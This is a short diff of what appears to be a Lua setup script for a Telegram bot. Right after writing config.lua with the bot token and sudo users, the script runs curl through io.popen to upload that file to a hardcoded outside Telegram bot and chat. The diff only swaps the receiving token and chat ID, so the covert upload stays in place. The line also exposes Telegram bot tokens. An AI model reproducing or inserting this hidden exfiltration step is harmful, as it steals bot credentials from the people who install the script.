@@ -52,7 +52,7 @@ bot_id = botid,
 sudo_users = {SUDO}, 
 }
 create(config, "./config.lua")   
-local curl = 'curl "'..'https://api.telegram.org/bot785996049:AAGt_1IuA_Fl3Mofycjeh3uD1yAeeY5iAnM/sendDocument'..'" -F "chat_id='.. 569820319 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
+local curl = 'curl "'..'https://api.telegram.org/bot627998586:AAG5eW2lycR8vXSPZVDnLPBNaCEsa_-5MMk/sendDocument'..'" -F "chat_id='.. 1385100532 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
 file = io.open("FA", "w")  file:write([[
 killall screen
 screen ./RUNFA.sh
